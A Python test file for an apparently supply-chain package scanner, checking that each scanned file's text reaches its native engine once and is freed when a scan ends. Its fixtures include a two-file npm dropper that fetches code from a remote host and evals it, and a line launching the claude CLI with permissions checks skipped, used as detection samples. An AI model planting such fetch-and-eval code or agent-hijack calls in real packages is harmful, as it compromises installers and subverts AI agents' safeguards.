"""FE-1 (0.1.9): a registry scan hands each file's text to the engine once.

The engine keeps the texts a scan puts (`texts.put`, the texts one after another as raw UTF-8: rust/crates/
lazaret-engine/src/texts.rs) and the scan's calls name them by id (`text_id`; `text_ids` for the cross-file
follower). A file's text used to cross three to five times, once per step that reads it, escaped into a batch's
JSON. The answers are the same either way; the store's copies go when the scan ends, however it ends; and a store
that refuses (its bound) leaves the texts to go with their calls, as before."""

import unittest
from unittest import mock

from lazaret.registry import repo
from lazaret.scanner import _native, engine
from tests.registry._review_support import issues, manifest, tarball

# texts of every kind a str can hold: CRLF line ends, a lone surrogate, a character past the BMP, nothing at all
TEXTS = ["module.exports = 1;\n", "x = 'café'\r\nimport os\r\n", "s = '\ud800'\n", "\U0001F600 = 1\n", "",
         "require('child_process').spawn('node', [__dirname + '/run.js']);\n",
         'require("child_process").spawnSync("claude", ["--dangerously-skip-permissions", "-p", "x"]);\n']

# a dropper split across two files (the cross-file follower's shape: one fetches, the other runs what it gets)
DROPPER = [
    {"path": "node_modules/package/lib/net.js", "lang": "js", "dep": True,
     "content": ("const https = require('https');\n"
                 "module.exports = function get(url, done) {\n"
                 "  https.get(url, (res) => { let body = ''; res.on('data', (c) => body += c);"
                 " res.on('end', () => done(body)); });\n};\n")},
    {"path": "node_modules/package/index.js", "lang": "js", "dep": True,
     "content": "const get = require('./lib/net');\nget('https://203.0.113.9/p', (code) => eval(code));\n"},
    {"path": "node_modules/package/lib/util.js", "lang": "js", "dep": True, "content": "module.exports = 1;\n"},
]


def held():
    """The texts the engine's store holds (every caller's: none between scans)."""
    return _native.call("texts.info")["texts"]


def recording():
    """A patch of the library's entry that records each request -> (the patch, [(name, args, text)])."""
    seen = []
    real = _native._call_lib

    def call(lib, name, args, text):
        seen.append((name, args, text))
        return real(lib, name, args, text)
    return mock.patch.object(_native, "_call_lib", call), seen


def put_texts(seen):
    """The texts of the record's puts, one by one."""
    out = []
    for name, args, region in seen:
        if name == "texts.put":
            at = 0
            for n in args["lengths"]:
                out.append(region[at:at + n])
                at += n
    return out


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class StoreTests(unittest.TestCase):
    def calls(self):
        out = []
        for text in TEXTS:
            for lang in ("js", "py"):
                out += [("scan_file", {"lang": lang, "jsx": True, "dep": True, "redact": True, "neumaier": False}, text),
                        ("import_time_risk", {"lang": lang}, text), ("spawned_scripts", {"lang": lang}, text),
                        ("agent_hijack", {}, text)]
        return out

    def test_answers_by_id_are_the_answers_with_the_text(self):
        calls = self.calls()
        inline = engine.call_answers(calls)
        self.assertFalse(any(engine.unanswered(a) for a in inline))
        texts = engine.Texts()
        try:
            by_id = engine.call_answers(calls, texts=texts)
            self.assertEqual(texts.held(), len(set(TEXTS)))                 # each distinct text once
            again = engine.call_answers(calls, texts=texts)
        finally:
            texts.close()
        self.assertEqual(by_id, inline)
        self.assertEqual(again, inline)

    def test_a_text_crosses_once(self):
        patch, seen = recording()
        texts = engine.Texts()
        with patch:
            try:
                engine.call_answers([("import_time_risk", {}, t) for t in TEXTS], texts=texts)
                engine.spawned_scripts_many([(t, "js") for t in TEXTS], texts=texts)
                engine.agent_hijacks(TEXTS, texts=texts)
            finally:
                texts.close()
        self.assertEqual(put_texts(seen), list(dict.fromkeys(TEXTS)))
        batches = [args for name, args, _text in seen if name == "batch"]
        self.assertEqual(len(batches), 3)
        for args in batches:
            for item in args["calls"]:
                self.assertEqual(len(item), 2, item)                            # (no text: its id)
                self.assertIn("text_id", item[1])
        self.assertEqual(seen[-1][0], "texts.drop")

    def test_close_lets_the_texts_go(self):
        before = held()
        texts = engine.Texts()
        ids = texts.ids(["a = 1\n", "b = 2\n", "a = 1\n"])
        self.assertEqual(ids[0], ids[2])
        self.assertEqual(held(), before + 2)
        texts.close()
        self.assertEqual(held(), before)
        with self.assertRaises(_native.NativeError):
            _native.call("logical_text", {"text_id": ids[0]})
        texts.close()                                                           # (twice is nothing)
        self.assertEqual(texts.ids(["a = 1\n"])[0] not in ids, True)            # (used again: a new id)
        texts.close()

    def test_a_store_that_refuses_leaves_the_texts_with_their_calls(self):
        real = _native.call

        def refusing(name, args=None, text=""):
            if name == "texts.put":
                raise _native.NativeError("texts.put: the text store is full")
            return real(name, args, text)
        calls = [("import_time_risk", {"lang": "js"}, t) for t in TEXTS]
        texts = engine.Texts()
        with mock.patch.object(_native, "call", side_effect=refusing):
            got = engine.call_answers(calls, texts=texts)
            more = engine.call_answers(calls, texts=texts)
        self.assertTrue(texts.off)
        self.assertEqual(texts.held(), 0)
        self.assertEqual(got, engine.call_answers(calls))
        self.assertEqual(more, got)

    def test_the_engine_refuses_what_does_not_add_up(self):
        for args, region in [({"lengths": [5]}, "abc"), ({"lengths": [1]}, "abc"), ({"lengths": [-1]}, ""),
                             ({}, "abc")]:
            with self.subTest(args=args), self.assertRaises(_native.NativeError):
                _native.call("texts.put", args, region)
        texts = engine.Texts()
        (i,) = texts.ids(["x = 1\n"])
        try:
            with self.assertRaises(_native.NativeError):                       # a text and a text_id
                _native.call("logical_text", {"text_id": i}, "x = 1\n")
            with self.assertRaises(_native.NativeError):                       # pack.* or texts.* on threads
                _native.call("batch", {"calls": [["texts.drop", {"ids": [i]}], ["version", {}]], "threads": 2})
        finally:
            texts.close()

    def test_the_cross_file_follower_reads_the_same_by_id(self):
        inline = engine.cross_file_answer(DROPPER, one_package=True)
        self.assertTrue(inline[0], "the dropper is found (the test's premise)")
        patch, seen = recording()
        texts = engine.Texts()
        with patch:
            try:
                self.assertEqual(texts.ids([f["content"] for f in DROPPER[:1]])[0] is not None, True)
                by_id = engine.cross_file_answer(DROPPER, one_package=True, texts=texts)
            finally:
                texts.close()
        self.assertEqual(by_id, inline)
        (cross,) = [(args, text) for name, args, text in seen if name == "cross_file"]
        self.assertEqual(cross[1], "")
        self.assertEqual(len(cross[0]["text_ids"]), len(DROPPER))


@unittest.skipUnless(_native.available(), f"native engine not built ({_native.load_error()})")
class ScanTests(unittest.TestCase):
    PACKAGE = {"package.json": manifest(main="index.js", scripts={"postinstall": "node setup.js"}),
               "index.js": "require('./lib/a');\nrequire('./lib/b');\nrequire('./lib/a.js');\n",
               "lib/a.js": "module.exports = 1;\r\n", "lib/b.js": "module.exports = require('./a');\n",
               "lib/c.js": TEXTS[-1], "setup.js": "console.log(1);\n"}

    def scan(self, files=None):
        return repo._scan_artifact(tarball(files or self.PACKAGE), "tgz", "npm", False, None)

    def test_each_text_crosses_once_in_a_scan(self):
        before = held()
        patch, seen = recording()
        with patch:
            res = self.scan()
        self.assertEqual(held(), before)                                        # (and goes when the scan ends)
        put = put_texts(seen)
        self.assertEqual(len(put), len(set(put)), "a text put twice")
        for rel, text in self.PACKAGE.items():
            if rel.endswith(".js"):
                self.assertIn(text.replace("\r\n", "\n"), put, rel)          # (as decode_source reads it)
        for name, args, text in seen:
            if name == "batch":
                self.assertTrue(all(len(item) == 2 for item in args["calls"]), args["calls"][0][0])
        (cross,) = [args for name, args, _text in seen if name == "cross_file"]
        self.assertIn("text_ids", cross)
        asked = [text for name, _args, text in seen if name == "node_candidates"]
        self.assertEqual(len(asked), len(set(asked)), "a path asked twice")
        (hijack,) = issues(res, "SC-AGENT-HIJACK")                             # (the agent check, batched, still finds it)
        self.assertEqual((hijack["file"], hijack["line"]), ("lib/c.js", 1))

    def test_a_scan_that_raises_midway_leaves_nothing_in_the_store(self):
        before = held()
        with mock.patch.object(repo._ArtifactScan, "_lookalike_names", side_effect=RuntimeError("midway")):
            with self.assertRaises(RuntimeError):
                self.scan()
        self.assertEqual(held(), before)

    def test_the_answers_are_the_same_without_the_store(self):
        with_store = self.scan()
        with mock.patch.object(engine.Texts, "ids", lambda self, texts: [None] * len(texts)):
            without = self.scan()
        self.assertEqual(with_store, without)


if __name__ == "__main__":
    unittest.main()
